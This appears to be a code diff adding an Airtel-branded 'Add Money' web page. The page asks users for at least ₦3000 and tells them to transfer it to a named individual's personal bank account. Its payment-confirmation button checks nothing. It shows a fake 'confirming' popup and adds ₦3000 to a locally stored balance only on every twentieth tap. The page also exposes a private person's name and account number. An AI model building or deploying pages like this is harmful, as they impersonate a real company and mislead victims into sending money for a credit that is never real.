@@ -1,0 +1,161 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Add Money</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      overflow-x: hidden;
+      position: relative;
+    }.airtel-background {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: url('airtel-logo-blur.png') repeat;
+  background-size: 100px;
+  opacity: 0.05;
+  z-index: -1;
+  animation: floatLogos 60s linear infinite;
+}
+
+@keyframes floatLogos {
+  0% { background-position: 0 0; }
+  100% { background-position: 1000px 1000px; }
+}
+
+.container {
+  max-width: 400px;
+  margin: 50px auto;
+  padding: 20px;
+  background-color: rgba(255, 255, 255, 0.95);
+  border-radius: 10px;
+  box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+}
+
+.logo {
+  display: block;
+  margin: 0 auto 20px;
+  width: 100px;
+}
+
+h2 {
+  text-align: center;
+  color: red;
+}
+
+input[type="number"] {
+  width: 100%;
+  padding: 12px;
+  margin: 10px 0;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+  font-size: 16px;
+}
+
+button {
+  width: 100%;
+  padding: 12px;
+  background-color: red;
+  color: white;
+  font-size: 16px;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+}
+
+button:hover {
+  background-color: darkred;
+}
+
+.account-details {
+  display: none;
+  text-align: center;
+  margin-top: 30px;
+}
+
+.popup {
+  display: none;
+  background-color: rgba(0,0,0,0.8);
+  color: white;
+  padding: 15px;
+  position: fixed;
+  top: 30%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  border-radius: 10px;
+  z-index: 9999;
+  text-align: center;
+  animation: fadeIn 0.5s ease;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+
+  </style>
+</head>
+<body>
+  <div class="airtel-background"></div>  <div class="container">
+    <img src="airtel-logo.png" alt="Airtel Logo" class="logo" />
+    <h2>Add Money</h2>
+    <input type="number" id="amount" placeholder="Enter Amount (min ₦3000)" />
+    <button onclick="handleContinue()">Continue</button><div class="account-details" id="accountDetails">
+  <img src="airtel-logo.png" alt="Airtel Logo" style="width: 80px; margin-bottom: 10px;">
+  <p><strong>Send to:</strong></p>
+  <p><strong>Name:</strong> EMMANUEL OKWUNNA</p>
+  <p><strong>Bank:</strong> SmartCash Payment Service Bank</p>
+  <p><strong>Account Number:</strong> 812 489 0070</p>
+  <button onclick="confirmPayment()">I Have Made Payments</button>
+  <br><br>
+  <button onclick="goToDashboard()">Back to Dashboard</button>
+</div>
+
+  </div>  <div class="popup" id="popup">Please wait...</div>  <script>
+    let tapCount = parseInt(localStorage.getItem('tapCount')) || 0;
+
+    function handleContinue() {
+      const amount = document.getElementById('amount').value;
+      if (amount < 3000) {
+        showPopup('Please input a minimum of ₦3000');
+        return;
+      }
+      showPopup('Please wait...');
+      setTimeout(() => {
+        document.getElementById('popup').style.display = 'none';
+        document.getElementById('accountDetails').style.display = 'block';
+      }, 2000);
+    }
+
+    function confirmPayment() {
+      tapCount++;
+      localStorage.setItem('tapCount', tapCount);
+      showPopup('Confirming your transaction, please wait...');
+      setTimeout(() => {
+        document.getElementById('popup').style.display = 'none';
+        if (tapCount % 20 === 0) {
+          let balance = parseInt(localStorage.getItem('balance')) || 0;
+          balance += 3000;
+          localStorage.setItem('balance', balance);
+          showPopup('₦3000 has been added to your wallet!');
+          setTimeout(() => document.getElementById('popup').style.display = 'none', 3000);
+        }
+      }, 2000);
+    }
+
+    function showPopup(message) {
+      const popup = document.getElementById('popup');
+      popup.textContent = message;
+      popup.style.display = 'block';
+    }
+
+    function goToDashboard() {
+      window.location.href = 'dashboard.html';
+    }
+  </script></body>
+</html>
